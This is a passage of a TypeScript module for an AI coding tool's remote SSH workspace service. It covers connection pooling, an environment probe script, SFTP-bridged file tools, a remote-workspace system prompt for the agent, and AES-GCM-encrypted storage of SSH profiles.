/**
 * remote-ssh-service.ts — 远程 SSH 连接管理、环境探针、SFTP 文件系统与远程命令/终端服务。
 *
 * 职责：
 * 1. 维护远程 SSH 连接池（按 user@host:port 复用、并发单飞握手、断线自动重连、空闲超时回收）；
 * 2. 远程环境探针（Probe）：检测系统架构、基础依赖（git/node/bash/python）及包管理器；
 * 3. 远程目录浏览与文件操作（SFTP）：为右栏文件树、文件预览/编辑、上传及 AI 工具提供远程读写；
 * 4. 远程命令执行与虚拟 PTY 终端：通过已鉴权的 ssh2 连接直接开启交互式 Shell 与命令执行；
 * 5. SSH Profiles 本地安全持久化：凭据使用 AES-256-GCM 加密，支持按 URI 自动提取凭据重连；
 * 6. 远程工作区本地会话目录映射：对话 JSONL 保存在本地 `<dataDir>/remote-workspaces/<slug>`。
 */

import { Client, type ClientChannel, type SFTPWrapper } from "ssh2";
import { createCipheriv, createDecipheriv, createHash, randomBytes, randomUUID } from "node:crypto";
import { existsSync, mkdirSync, readFileSync, writeFileSync, promises as fs } from "node:fs";
import os from "node:os";
import path from "node:path";
import { Readable } from "node:stream";
import { pathToFileURL } from "node:url";
import { resolveDefaultPkgRoot } from "./plugin-updater.js";
import { isAudioFile, previewKind } from "./text-sniff.js";
import type {
	RemoteSshDirItem,
	RemoteSshProbeParams,
	RemoteSshProfileSummary,
	RemoteSshSystemInfo,
	RemoteSshToolsInfo,
} from "./protocol.js";

const IDLE_TIMEOUT_MS = 30 * 60 * 1000; // 连接空闲 30 分钟自动断开
const PROBE_TIMEOUT_MS = 25_000;

export interface ParsedRemoteUri {
	username: string;
	host: string;
	port: number;
	remotePath: string;
	hostKey: string;
}

interface ActiveConnection {
	id: string;
	hostKey: string;
	client: Client;
	sftp?: SFTPWrapper;
	// 并发首调的在途 SFTP 子系统通道 Promise（单飞，防止重复开通道泄漏）
	sftpInflight?: Promise<SFTPWrapper>;
	params: RemoteSshProbeParams;
	system?: RemoteSshSystemInfo;
	alive: boolean;
	timer: NodeJS.Timeout;
}

interface StoredProfile {
	name: string;
	host: string;
	port: number;
	username: string;
	authType: "password" | "key" | "agent";
	privateKeyPath?: string;
	encryptedPassword?: { iv: string; tag: string; ct: string };
	encryptedPassphrase?: { iv: string; tag: string; ct: string };
	lastConnected: number;
	remotePath?: string;
	description?: string;
}

interface StoredProfilesFile {
	version: 1;
	profiles: Record<string, StoredProfile>;
}

const DEFAULT_KEY_CANDIDATES = ["~/.ssh/id_ed25519", "~/.ssh/id_ecdsa", "~/.ssh/id_rsa", "~/.ssh/id_dsa"];

/** `~` 路径展开 */
export function expandHome(p?: string): string | undefined {
	if (p === undefined) return undefined;
	const s = p.trim();
	if (!s) return s;
	if (s === "~") return os.homedir();
	if (s.startsWith("~/") || s.startsWith("~\\")) {
		return path.join(os.homedir(), s.slice(2));
	}
	return s;
}

/** 判断路径是否为 ssh:// 远程工作区 URI */
export function isRemoteWorkspaceUri(uri?: string | null): boolean {
	return Boolean(uri && uri.trim().startsWith("ssh://"));
}

/** 解析 ssh://user@host:port/remote/path */
export function parseRemoteWorkspaceUri(uri: string): ParsedRemoteUri | null {
	if (!isRemoteWorkspaceUri(uri)) return null;
	const trimmed = uri.trim();
	const m = /^ssh:\/\/([^@]+)@([^:/]+)(?::(\d+))?(\/.*)?$/.exec(trimmed);
	if (!m) return null;
	const username = m[1];
	const host = m[2];
	const port = m[3] ? parseInt(m[3], 10) || 22 : 22;
	const rawPath = m[4] ? m[4].replace(/\\/g, "/") : "/";
	const remotePath = path.posix.normalize(rawPath).replace(/\/+$/, "") || "/";
	return {
		username,
		host,
		port,
		remotePath,
		hostKey: `${username}@${host}:${port}`,
	};
}

/** 构造规范的 ssh://user@host:port/remote/path */
export function formatRemoteWorkspaceUri(username: string, host: string, port: number, remotePath: string): string {
	const cleanPath = path.posix.normalize((remotePath || "/").replace(/\\/g, "/"));
	const normPath = cleanPath.startsWith("/") ? cleanPath : `/${cleanPath}`;
	return `ssh://${username}@${host}:${port || 22}${normPath !== "/" ? normPath.replace(/\/+$/, "") : "/"}`;
}

/**
 * 在远程工作区根 remoteRoot 下解析相对或绝对路径，防止 `..` 越界。
 * 返回 { abs: 远程 posix 绝对路径, rel: 相对工作区根的 posix 相对路径（根自身为 ""） }
 */
export function resolveRemoteWorkspacePath(remoteRoot: string, rawPath: string): { abs: string; rel: string } | null {
	const root = path.posix.normalize(remoteRoot.replace(/\\/g, "/")).replace(/\/+$/, "") || "/";
	let cleaned = (rawPath || "").replace(/\\/g, "/").trim();
	if (isRemoteWorkspaceUri(cleaned)) {
		const parsed = parseRemoteWorkspaceUri(cleaned);
		if (parsed) {
			cleaned = parsed.remotePath;
		}
	}
	if (!cleaned || cleaned === ".") {
		return { abs: root, rel: "" };
	}
	const abs = cleaned.startsWith("/") ? path.posix.normalize(cleaned) : path.posix.resolve(root, cleaned);
	const rel = path.posix.relative(root, abs);
	if (rel.startsWith("..") || rel.includes("/..") || path.posix.isAbsolute(rel)) {
		return null;
	}
	return { abs, rel: rel === "." ? "" : rel };
}

const REMOTE_URI_MARKER_FILE = ".pi-remote-uri";

/**
 * 将工作区路径（本地目录或 ssh:// URI）映射到本地会话物理存储目录。
 * - 本地工作区原样返回；
 * - 远程 ssh:// 工作区映射到 `<dataDir>/remote-workspaces/<slug>`，并在其中写入 `.pi-remote-uri` 标记文件，
 *   使得所有的会话 JSONL、计划、草稿全部 100% 存储在本地磁盘。
 */
export function resolveWorkspaceSessionDir(dataDir: string | undefined, cwdOrUri: string): string {
	const trimmed = (cwdOrUri || "").trim();
	if (!isRemoteWorkspaceUri(trimmed)) {
		return trimmed;
	}
	const safeDataDir = dataDir || process.env.PI_WEB_DATA_DIR || path.join(os.homedir(), ".pi-web");
	const parsed = parseRemoteWorkspaceUri(trimmed);
	const hash = createHash("sha1").update(trimmed).digest("hex").slice(0, 10);
	const baseName = parsed
		? `${parsed.username}_${parsed.host}_${parsed.port}_${parsed.remotePath.replace(/[^a-zA-Z0-9_-]/g, "_").replace(/^_+|_+$/g, "")}`.slice(
				0,
				72,
			)
		: trimmed.replace(/[^a-zA-Z0-9_-]/g, "_").slice(0, 72);
	const dir = path.resolve(safeDataDir, "remote-workspaces", `${baseName}_${hash}`);
	try {
		mkdirSync(dir, { recursive: true });
		const markerPath = path.join(dir, REMOTE_URI_MARKER_FILE);
		if (!existsSync(markerPath)) {
			writeFileSync(markerPath, trimmed, "utf8");
		}
	} catch {
		// ignore mkdir error in read-only edge cases
	}
	return dir;
}

/**
 * 从本地会话物理存储目录还原出工作区标识：
 * 若目录下含有 `.pi-remote-uri` 标记文件，则返回原始 `ssh://...` URI；否则原样返回本地路径。
 */
export function restoreWorkspaceUriFromSessionDir(dir: string): string {
	if (!dir || isRemoteWorkspaceUri(dir)) return dir;
	try {
		const markerPath = path.join(dir, REMOTE_URI_MARKER_FILE);
		if (existsSync(markerPath)) {
			const uri = readFileSync(markerPath, "utf8").trim();
			if (isRemoteWorkspaceUri(uri)) return uri;
		}
	} catch {
		// ignore
	}
	return dir;
}

/** Shell 安全单引号转义 */
export function shellQuotePosix(s: string): string {
	return `'${String(s).replace(/'/g, `'\\''`)}'`;
}

/**
 * 将 SDK resolveToCwd 产生的本地路径（或原始输入路径）映射为远程工作区的 posix 绝对路径。
 */
export function mapResolvedPathToRemote(
	resolvedOrRawPath: string,
	localSessionDir: string,
	remoteWorkspaceUri: string,
): string {
	const parsed = parseRemoteWorkspaceUri(remoteWorkspaceUri);
	const remoteRoot = parsed?.remotePath || "/";
	const raw = (resolvedOrRawPath || "").trim();
	if (!raw || raw === ".") return remoteRoot;

	try {
		const rel = path.relative(path.resolve(localSessionDir), path.resolve(raw));
		if (rel === "") return remoteRoot;
		if (!rel.startsWith("..") && !path.isAbsolute(rel)) {
			return path.posix.join(remoteRoot, rel.split(path.sep).join("/"));
		}
	} catch {}

	const stripped = raw
		.replace(/^[A-Za-z]:/, "")
		.split(path.sep)
		.join("/");
	return stripped.startsWith("/") ? path.posix.normalize(stripped) : path.posix.resolve(remoteRoot, stripped);
}

/**
 * 生成面向 AI 的远程工作区身份与工具透明桥接提示词。
 * 在远程工作区下替代本地 WINDOWS_PERSONA 的平台身份描述，同时完整保留防挂死（timeout / 禁前台长驻 / TTY 禁交互 / GBK 编码）核心规则。
 */
export function buildRemoteWorkspacePersona(remoteUri: string): string {
	const parsed = parseRemoteWorkspaceUri(remoteUri);
	const hostDesc = parsed ? `${parsed.username}@${parsed.host}:${parsed.port}` : remoteUri;
	const remoteDir = parsed ? parsed.remotePath : remoteUri;
	return [
		`You are operating inside a REMOTE SSH workspace (${remoteUri}).`,
		`- Target host: ${hostDesc}`,
		`- Remote working directory: ${remoteDir}`,
		`- All built-in workspace tools (bash, read, write, edit, edit_soft, ls, find, grep) and interactive terminals are ALREADY transparently bridged to execute directly on the remote host in "${remoteDir}".`,
		`- Use normal POSIX relative paths (e.g. "src/index.ts") or remote absolute paths (e.g. "${remoteDir}/src/index.ts") directly in read/write/edit/bash/ls/find/grep. Do NOT wrap bash commands in "ssh ..." and do NOT treat this workspace as the local client OS.`,
		``,
		`Follow these rules to avoid hanging the session:`,
		`- ALWAYS pass a timeout parameter to the bash tool (in seconds). There is NO default timeout — a command that never finishes (servers, watchers, infinite loops, slow downloads/installs) will hang the entire conversation indefinitely. Pick a generous timeout for long-running work, but never omit it.`,
		`- NEVER run interactive or foreground long-running commands through the bash tool (vi, less, top, python -, node -, npm run dev, sleep 10000). For servers/daemons use background execution with output redirected to a log file, then poll the log; stop them when done.`,
		`- In the interactive terminal (TTY) — NEVER use heredocs (<<'EOF' ... EOF) or here-strings, and NEVER start interactive programs (vi, less, python -, node -, npm init): they wait for keyboard input that never arrives and hang the terminal forever. Prefer writing a temp script file (e.g. .pi-tmp.sh) and running it non-interactively. ALWAYS pass a timeout to long-running commands (e.g. \`timeout 120 npm run dev\`).`,
		`- Many legacy Chinese text files (.html/.txt/.md/.log, exported documents) are GBK/GB2312 encoded: the read tool decodes UTF-8 only and will show mojibake (乱码) for them. If a file's content looks garbled, read it through the terminal or bash using \`iconv -f GBK -t UTF-8 file\`. Never paste mojibake into your reasoning or answer — describe the decoded content instead.`,
	].join("\n");
}

/**
 * 将会话 cwd 格式化为系统提示词里的 Current working directory 展示文本。
 * 若为远程工作区，展示远程真实目录与 SSH URI，绝不向模型暴露本地缓存路径。
 */
export function formatCwdForPrompt(cwdOrSessionDir: string): string {
	const real = restoreWorkspaceUriFromSessionDir(cwdOrSessionDir);
	if (isRemoteWorkspaceUri(real)) {
		const parsed = parseRemoteWorkspaceUri(real);
		return parsed ? `${parsed.remotePath} (remote SSH: ${real})` : real;
	}
	return cwdOrSessionDir;
}

/**
 * 若当前会话目录对应远程 ssh:// 工作区，构造供 SDK 内置工具（read/write/edit/ls/find/grep）使用的远程 operations。
 * 若为普通本地工作区则返回 null。
 */
export function createRemoteSdkOperations(localSessionDir: string) {
	const remoteUri = restoreWorkspaceUriFromSessionDir(localSessionDir);
	if (!isRemoteWorkspaceUri(remoteUri)) return null;

	const toRemote = (p: string) => mapResolvedPathToRemote(p, localSessionDir, remoteUri);
	const getSvc = () => {
		const svc = getGlobalRemoteSshService();
		if (!svc) throw new Error("Remote SSH service is not initialized");
		return svc;
	};

	return {
		remoteUri,
		toRemote,
		isDirectory: async (p: string): Promise<boolean> => {
			try {
				const st = await getSvc().sftpStat(remoteUri, toRemote(p));
				return st.isDirectory;
			} catch {
				return false;
			}
		},
		read: {
			readFile: async (p: string): Promise<Buffer> => {
				const { data } = await getSvc().sftpReadFile(remoteUri, toRemote(p));
				return data;
			},
			access: async (p: string): Promise<void> => {
				await getSvc().sftpStat(remoteUri, toRemote(p));
			},
		},
		write: {
			writeFile: async (p: string, content: string): Promise<void> => {
				await getSvc().sftpWriteFile(remoteUri, toRemote(p), content, { createParents: true });
			},
			mkdir: async (dir: string): Promise<void> => {
				await getSvc().sftpMkdirRecursive(remoteUri, toRemote(dir));
			},
		},
		edit: {
			readFile: async (p: string): Promise<Buffer> => {
				const { data } = await getSvc().sftpReadFile(remoteUri, toRemote(p));
				return data;
			},
			writeFile: async (p: string, content: string): Promise<void> => {
				await getSvc().sftpWriteFile(remoteUri, toRemote(p), content, { createParents: true });
			},
			access: async (p: string): Promise<void> => {
				await getSvc().sftpStat(remoteUri, toRemote(p));
			},
		},
		ls: {
			exists: async (p: string): Promise<boolean> => {
				try {
					await getSvc().sftpStat(remoteUri, toRemote(p));
					return true;
				} catch {
					return false;
				}
			},
			stat: async (p: string): Promise<{ isDirectory: () => boolean }> => {
				const st = await getSvc().sftpStat(remoteUri, toRemote(p));
				return { isDirectory: () => st.isDirectory };
			},
			readdir: async (p: string): Promise<string[]> => {
				const entries = await getSvc().sftpReaddir(remoteUri, toRemote(p));
				return entries.map((e) => e.name);
			},
		},
		find: {
			exists: async (p: string): Promise<boolean> => {
				try {
					await getSvc().sftpStat(remoteUri, toRemote(p));
					return true;
				} catch {
					return false;
				}
			},
			glob: async (
				pattern: string,
				searchPath: string,
				options: { ignore: string[]; limit: number },
			): Promise<string[]> => {
				const remoteDir = toRemote(searchPath);
				const limit = Math.max(1, options.limit || 1000);
				const namePat = pattern.includes("/") ? pattern.split("/").pop() || "*" : pattern;
				const cmd = `find . \\( -name node_modules -o -name .git \\) -prune -o -name ${shellQuotePosix(namePat)} -print 2>/dev/null | head -n ${limit}`;
				const res = await getSvc().execInWorkspace(remoteUri, cmd, { cwd: remoteDir, timeoutMs: 15_000 });
				return res.stdout
					.split(/\r?\n/)
					.map((l) => l.trim().replace(/^\.\//, ""))
					.filter((l) => l && l !== ".");
			},
		},
		grepExecute: async (params: {
			pattern: string;
			path?: string;
			glob?: string;
			ignoreCase?: boolean;
			literal?: boolean;
			context?: number;
			limit?: number;
		}): Promise<string> => {
			const remoteTarget = toRemote(params.path || ".");
			const limit = Math.max(1, params.limit ?? 100);
			const flags: string[] = ["-rnI", "--exclude-dir=node_modules", "--exclude-dir=.git"];
			if (params.ignoreCase) flags.push("-i");
			if (params.literal) flags.push("-F");
			else flags.push("-E");
			if (params.context && params.context > 0) flags.push(`-C ${Math.floor(params.context)}`);
			if (params.glob) flags.push(`--include=${shellQuotePosix(params.glob)}`);
			const cmd = `grep ${flags.join(" ")} -- ${shellQuotePosix(params.pattern)} ${shellQuotePosix(remoteTarget)} 2>/dev/null | head -n ${limit}`;
			const res = await getSvc().execInWorkspace(remoteUri, cmd, { timeoutMs: 15_000 });
			const out = res.stdout.trim();
			return out || "No matches found";
		},
	};
}

let globalRemoteSshService: RemoteSshService | null = null;

export function setGlobalRemoteSshService(svc: RemoteSshService): void {
	globalRemoteSshService = svc;
}

export function getGlobalRemoteSshService(): RemoteSshService | null {
	return globalRemoteSshService;
}

export class RemoteSshService {
	private readonly dataDir: string;
	private readonly connections = new Map<string, ActiveConnection>();
	private readonly hostConnections = new Map<string, string>(); // hostKey -> connectionId
	private readonly inflightConnects = new Map<string, Promise<ActiveConnection>>();
	private readonly credentialCache = new Map<string, RemoteSshProbeParams>(); // hostKey -> hydrated params
	private secretKey: Buffer | null = null;

	constructor(dataDir: string) {
		this.dataDir = dataDir;
	}

	/** 获取或初始化本地凭据加密密钥（32 字节 AES 密钥） */
	private async getSecretKey(): Promise<Buffer> {
		if (this.secretKey) return this.secretKey;
		const keyPath = path.join(this.dataDir, ".remote-ssh.key");
		try {
			if (existsSync(keyPath)) {
				const buf = await fs.readFile(keyPath);
				if (buf.length === 32) {
					this.secretKey = buf;
					return buf;
				}
			}
		} catch {}

		const generated = randomBytes(32);
		try {
			await fs.mkdir(this.dataDir, { recursive: true });
			await fs.writeFile(keyPath, generated, { mode: 0o600 });
			this.secretKey = generated;
		} catch {
			this.secretKey = generated;
		}
		return this.secretKey;
	}

	private async seal(text: string): Promise<{ iv: string; tag: string; ct: string }> {
		const key = await this.getSecretKey();
		const iv = randomBytes(12);
		const cipher = createCipheriv("aes-256-gcm", key, iv);
		const ct = Buffer.concat([cipher.update(text, "utf8"), cipher.final()]);
		return {
			iv: iv.toString("hex"),
			tag: cipher.getAuthTag().toString("hex"),
			ct: ct.toString("hex"),
		};
	}

	private async unseal(blob?: { iv: string; tag: string; ct: string }): Promise<string | undefined> {
		if (!blob) return undefined;
		try {
			const key = await this.getSecretKey();
			const decipher = createDecipheriv("aes-256-gcm", key, Buffer.from(blob.iv, "hex"));
			decipher.setAuthTag(Buffer.from(blob.tag, "hex"));
			const pt = Buffer.concat([decipher.update(Buffer.from(blob.ct, "hex")), decipher.final()]);
			return pt.toString("utf8");
		} catch {
			return undefined;
		}
	}

	private get profilesFilePath(): string {
		return path.join(this.dataDir, "global-hosts.json");
	}

	private get legacyProfilesFilePath(): string {
		return path.join(this.dataDir, "ssh-profiles.json");
	}

	private async loadProfilesData(): Promise<StoredProfilesFile> {
		try {
			if (existsSync(this.profilesFilePath)) {
				const content = await fs.readFile(this.profilesFilePath, "utf8");
				const parsed = JSON.parse(content) as StoredProfilesFile;
				if (parsed && parsed.version === 1 && typeof parsed.profiles === "object") {
					return parsed;
				}
			} else if (existsSync(this.legacyProfilesFilePath)) {
				const content = await fs.readFile(this.legacyProfilesFilePath, "utf8");
				const parsed = JSON.parse(content) as StoredProfilesFile;
				if (parsed && parsed.version === 1 && typeof parsed.profiles === "object") {
					// 迁移到新的 global-hosts.json
					await fs.mkdir(this.dataDir, { recursive: true });
					await fs.writeFile(this.profilesFilePath, JSON.stringify(parsed, null, 2), "utf8");
					return parsed;
				}
			}
		} catch {}
		return { version: 1, profiles: {} };
	}

	private async saveProfilesData(data: StoredProfilesFile): Promise<void> {
		try {
			await fs.mkdir(this.dataDir, { recursive: true });
			const json = JSON.stringify(data, null, 2);
			await fs.writeFile(this.profilesFilePath, json, "utf8");
			// 同时保持旧文件同步（防止外部或旧调用方异常）
			await fs.writeFile(this.legacyProfilesFilePath, json, "utf8").catch(() => {});
		} catch (err) {
			console.error("[remote-ssh] 无法保存 profiles 文件:", err);
		}
	}

	/** 列出所有已保存的 SSH profiles */
	async listProfiles(): Promise<RemoteSshProfileSummary[]> {
		const data = await this.loadProfilesData();
		return Object.values(data.profiles)
			.map((p) => ({
				name: p.name,
				host: p.host,
				port: p.port,
				username: p.username,
				authType: p.authType,
				privateKeyPath: p.privateKeyPath,
				lastConnected: p.lastConnected,
				remotePath: p.remotePath,
				description: p.description,
			}))
			.sort((a, b) => (b.lastConnected ?? 0) - (a.lastConnected ?? 0));
	}

	/** 获取解密后的 profile 凭据（仅供受信任的服务端内部模块使用） */
	async getDecryptedProfile(name: string): Promise<{
		profile: RemoteSshProfileSummary;
		password?: string;
		passphrase?: string;
	} | null> {
		const data = await this.loadProfilesData();
		const p = data.profiles[name];
		if (!p) return null;
		let password: string | undefined;
		let passphrase: string | undefined;
		if (p.authType === "password" && p.encryptedPassword) {
			password = await this.unseal(p.encryptedPassword);
		} else if (p.authType === "key" && p.encryptedPassphrase) {
			passphrase = await this.unseal(p.encryptedPassphrase);
		}
		return {
			profile: {
				name: p.name,
				host: p.host,
				port: p.port,
				username: p.username,
				authType: p.authType,
				privateKeyPath: p.privateKeyPath,
				lastConnected: p.lastConnected,
				remotePath: p.remotePath,
				description: p.description,
			},
			password,
			passphrase,
		};
	}

	/** 删除一个已保存的 profile */
	async deleteProfile(name: string): Promise<void> {
		const data = await this.loadProfilesData();
		if (data.profiles[name]) {
			delete data.profiles[name];
			await this.saveProfilesData(data);
		}
	}

	/** 记录或更新一个 profile */
	async saveProfile(
		name: string,
		params: RemoteSshProbeParams,
		meta?: { remotePath?: string; description?: string },
	): Promise<void> {
		const data = await this.loadProfilesData();
		const existing = data.profiles[name];
		const auth = params.auth;
		const stored: StoredProfile = {
			name,
			host: params.host,
			port: params.port ?? 22,
			username: params.username,
			authType: auth.type,
			privateKeyPath: auth.type === "key" ? auth.privateKeyPath : undefined,
			lastConnected: Date.now(),
			remotePath: meta?.remotePath ?? existing?.remotePath,
			description: meta?.description ?? existing?.description,
		};

		if (auth.type === "password") {
			if (auth.password) {
				stored.encryptedPassword = await this.seal(auth.password);
			} else if (existing?.encryptedPassword) {
				stored.encryptedPassword = existing.encryptedPassword;
			}
		} else if (auth.type === "key") {
			if (auth.passphrase) {
				stored.encryptedPassphrase = await this.seal(auth.passphrase);
			} else if (existing?.encryptedPassphrase) {
				stored.encryptedPassphrase = existing.encryptedPassphrase;
			}
		}

		data.profiles[name] = stored;
		await this.saveProfilesData(data);
	}

	/**
	 * 从内存缓存或磁盘已保存的 profile 中补全缺失的密码/私钥口令。
	 * 例如用户在界面点击已保存的 profile 时前端未持有明文密码，此处自动解密填充。
	 */
	private async hydrateAuthParams(params: RemoteSshProbeParams): Promise<RemoteSshProbeParams> {
		const port = params.port ?? 22;
		const hostKey = `${params.username}@${params.host}:${port}`;
		const cloned: RemoteSshProbeParams = {
			...params,
			port,
			auth: { ...params.auth },
		};

		const data = await this.loadProfilesData();
		const matchedProfile =
			(params.profileName ? data.profiles[params.profileName] : undefined) ??
			Object.values(data.profiles).find(
				(p) => p.host === params.host && (p.port || 22) === port && p.username === params.username,
			);

		if (cloned.auth.type === "password" && !cloned.auth.password) {
			const cached = this.credentialCache.get(hostKey);
			if (cached?.auth.type === "password" && cached.auth.password) {
				cloned.auth.password = cached.auth.password;
			} else if (matchedProfile?.encryptedPassword) {
				const decrypted = await this.unseal(matchedProfile.encryptedPassword);
				if (decrypted) cloned.auth.password = decrypted;
			}
		} else if (cloned.auth.type === "key") {
			if (!cloned.auth.privateKeyPath && matchedProfile?.privateKeyPath) {
				cloned.auth.privateKeyPath = matchedProfile.privateKeyPath;
			}
			if (!cloned.auth.passphrase && matchedProfile?.encryptedPassphrase) {
				const decrypted = await this.unseal(matchedProfile.encryptedPassphrase);
				if (decrypted) cloned.auth.passphrase = decrypted;
			}
		}

		return cloned;
	}

	/** 关闭某个连接 */
	closeConnection(id: string): void {
		const conn = this.connections.get(id);
		if (conn) {
			conn.alive = false;
			clearTimeout(conn.timer);
			if (this.hostConnections.get(conn.hostKey) === id) {
				this.hostConnections.delete(conn.hostKey);
			}
			try {
				conn.client.end();
			} catch {}
			this.connections.delete(id);
		}
	}

	private refreshConnectionTimer(conn: ActiveConnection): void {
		clearTimeout(conn.timer);
		conn.timer = setTimeout(() => {
			this.closeConnection(conn.id);
		}, IDLE_TIMEOUT_MS);
		conn.timer.unref?.();
	}

	/** 建立底层 ssh2 Client 连接 */
	private async createClient(
		rawParams: RemoteSshProbeParams,
	): Promise<{ client: Client; hydrated: RemoteSshProbeParams }> {
		const params = await this.hydrateAuthParams(rawParams);
		// plugin-sdk ships in both source and npm layouts; SFTP imports the same verifier.
		const packageRoot = resolveDefaultPkgRoot();
		if (!packageRoot) throw new Error("Cannot locate SSH host verification module");
		const { createHostVerifier } = await import(
			pathToFileURL(path.join(packageRoot, "plugin-sdk", "ssh-host-trust.mjs")).href
		);
		const trust = await createHostVerifier(params.host, params.port ?? 22);
		const client = new Client();
		const connectConfig: Record<string, unknown> = {
			hostVerifier: trust.hostVerifier,
			host: params.host,
			port: params.port ?? 22,
			username: params.username,
			readyTimeout: PROBE_TIMEOUT_MS,
			keepaliveInterval: 10_000,
			keepaliveCountMax: 3,
		};

		const auth = params.auth;
		if (auth.type === "password") {
			connectConfig.password = auth.password;
			// 同时支持 keyboard-interactive（许多 Linux OpenSSH 默认用 keyboard-interactive 验证密码）
			connectConfig.tryKeyboard = true;
			client.on("keyboard-interactive", (_name, _instructions, _instructionsLang, prompts, finish) => {
				finish(prompts.map(() => auth.password ?? ""));
			});
		} else if (auth.type === "key") {
			if (auth.privateKey) {
				connectConfig.privateKey = auth.privateKey;
			} else {
				let keyFile = expandHome(auth.privateKeyPath);
				if (!keyFile || !existsSync(keyFile)) {
					for (const cand of DEFAULT_KEY_CANDIDATES) {
						const exp = expandHome(cand);
						if (exp && existsSync(exp)) {
							keyFile = exp;
							break;
						}
					}
				}
				if (keyFile) {
					connectConfig.privateKey = await fs.readFile(keyFile);
				}
			}
			if (auth.passphrase) {
				connectConfig.passphrase = auth.passphrase;
			}
		} else if (auth.type === "agent") {
			const sock = process.env.SSH_AUTH_SOCK || (process.platform === "win32" ? "\\\\.\\pipe\\openssh-ssh-agent" : "");
			if (sock) connectConfig.agent = sock;
		}

		return new Promise((resolve, reject) => {
			const cleanup = () => {
				client.removeListener("ready", onReady);
				client.removeListener("error", onError);
			};
			const onReady = () => {
				cleanup();
				resolve({ client, hydrated: params });
			};
			const onError = (err: Error) => {
				cleanup();
				reject(trust.getError() ?? err);
			};

			client.once("ready", onReady);
			client.once("error", onError);

			try {
				client.connect(connectConfig as any);
			} catch (err) {
				cleanup();
				reject(err);
			}
		});
	}

	/** 注册活跃连接并监听断开事件 */
	private registerConnection(client: Client, hydrated: RemoteSshProbeParams): ActiveConnection {
		const connId = randomUUID();
		const hostKey = `${hydrated.username}@${hydrated.host}:${hydrated.port ?? 22}`;
		const conn: ActiveConnection = {
			id: connId,
			hostKey,
			client,
			params: hydrated,
			alive: true,
			timer: setTimeout(() => this.closeConnection(connId), IDLE_TIMEOUT_MS),
		};
		conn.timer.unref?.();

		const markDead = () => {
			conn.alive = false;
			if (this.hostConnections.get(hostKey) === connId) {
				this.hostConnections.delete(hostKey);
			}
			this.connections.delete(connId);
			clearTimeout(conn.timer);
		};
		client.once("close", markDead);
		client.once("end", markDead);
		client.on("error", () => {
			markDead();
		});

		this.connections.set(connId, conn);
		this.hostConnections.set(hostKey, connId);
		this.credentialCache.set(hostKey, hydrated);
		return conn;
	}

	/** 执行远端 shell 命令并获取 stdout（默认 120s 超时——探针/安装脚本挂起时不至于永久 pending） */
	private async execCommand(client: Client, cmd: string, timeoutMs = 120_000): Promise<string> {
		return new Promise((resolve, reject) => {
			let settled = false;
			const timer =
				timeoutMs > 0
					? setTimeout(() => {
							if (settled) return;
							settled = true;
							reject(new Error(`Remote command timed out after ${timeoutMs}ms`));
						}, timeoutMs)
					: null;
			client.exec(cmd, (err, stream) => {
				if (err) {
					if (settled) return;
					settled = true;
					if (timer) clearTimeout(timer);
					return reject(err);
				}
				let stdout = "";
				let stderr = "";
				stream.on("data", (chunk: Buffer) => {
					stdout += chunk.toString("utf8");
				});
				stream.stderr.on("data", (chunk: Buffer) => {
					stderr += chunk.toString("utf8");
				});
				stream.on("close", (code: number) => {
					if (settled) return;
					settled = true;
					if (timer) clearTimeout(timer);
					if (code === 0) {
						resolve(stdout);
					} else {
						resolve(stdout || stderr);
					}
				});
				stream.on("error", (e: Error) => {
					if (settled) return;
					settled = true;
					if (timer) clearTimeout(timer);
					reject(e);
				});
			});
		});
	}

	/** 远程环境深度探针（Probe） */
	async probe(params: RemoteSshProbeParams): Promise<{
		ok: boolean;
		connectionId?: string;
		error?: string;
		system?: RemoteSshSystemInfo;
		tools?: RemoteSshToolsInfo;
		packageManager?: string;
		suggestedInstall?: string[];
	}> {
		let client: Client;
		let hydrated: RemoteSshProbeParams;
		let conn: ActiveConnection;

		const port = params.port ?? 22;
		const hostKey = `${params.username}@${params.host}:${port}`;
		const existingId = this.hostConnections.get(hostKey);
		const existingConn = existingId ? this.connections.get(existingId) : undefined;
		if (existingConn && existingConn.alive) {
			conn = existingConn;
			client = existingConn.client;
			hydrated = existingConn.params;
		} else {
			try {
				const res = await this.createClient(params);
				client = res.client;
				hydrated = res.hydrated;
				conn = this.registerConnection(client, hydrated);
			} catch (err) {
				return {
					ok: false,
					error: (err as Error).message || String(err),
				};
			}
		}

		// 无论是否显式勾选，连接成功都持久化凭据以便打开远程工作区后能够跨请求/跨重启自动重连
		if (params.saveProfile !== false) {
			const pName = params.profileName?.trim() || `${hydrated.username}@${hydrated.host}`;
			await this.saveProfile(pName, hydrated);
		}

		const probeScript = `
echo "===SYSTEM==="
uname -s
uname -m
uname -n
echo "$USER"
echo "$HOME"
(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || sysctl -n hw.ncpu 2>/dev/null || echo "1")
(awk '/MemTotal/ {print int($2/1024)}' /proc/meminfo 2>/dev/null || free -m 2>/dev/null | awk '/Mem:/ {print $2}' || sysctl -n hw.memsize 2>/dev/null | awk '{print int($1/1024/1024)}' || echo "0")
echo "===GIT==="
which git 2>/dev/null && git --version 2>/dev/null || echo "NONE"
echo "===NODE==="
which node 2>/dev/null && node -v 2>/dev/null || echo "NONE"
echo "===BASH==="
which bash 2>/dev/null || echo "NONE"
echo "===PYTHON==="
(which python3 2>/dev/null && python3 --version 2>/dev/null) || (which python 2>/dev/null && python --version 2>/dev/null) || echo "NONE"
echo "===PKG==="
for p in apt-get dnf yum apk pacman brew; do
  if command -v $p >/dev/null 2>&1; then echo "$p"; break; fi
done
`;

		try {
			const output = await this.execCommand(client, probeScript);
			const parsed = this.parseProbeOutput(output);
			conn.system = parsed.system;

			return {
				ok: true,
				connectionId: conn.id,
				system: parsed.system,
				tools: parsed.tools,
				packageManager: parsed.packageManager,
				suggestedInstall: parsed.suggestedInstall,
			};
		} catch (err) {
			return {
				ok: false,
				connectionId: conn.id,
				error: `探针执行失败: ${(err as Error).message}`,
			};
		}
	}

	private parseProbeOutput(raw: string): {
		system: RemoteSshSystemInfo;
		tools: RemoteSshToolsInfo;
		packageManager: string;
		suggestedInstall: string[];
	} {
		const lines = raw.split(/\r?\n/).map((l) => l.trim());
		const sections: Record<string, string[]> = {};
		let currentSection = "INIT";

		for (const line of lines) {
			if (line.startsWith("===") && line.endsWith("===")) {
				currentSection = line.slice(3, -3);
				sections[currentSection] = [];
			} else if (currentSection) {
				sections[currentSection] = sections[currentSection] || [];
				sections[currentSection].push(line);
			}
		}

		const sysLines = (sections["SYSTEM"] || []).filter(Boolean);
		const osName = sysLines[0] || "Unknown";
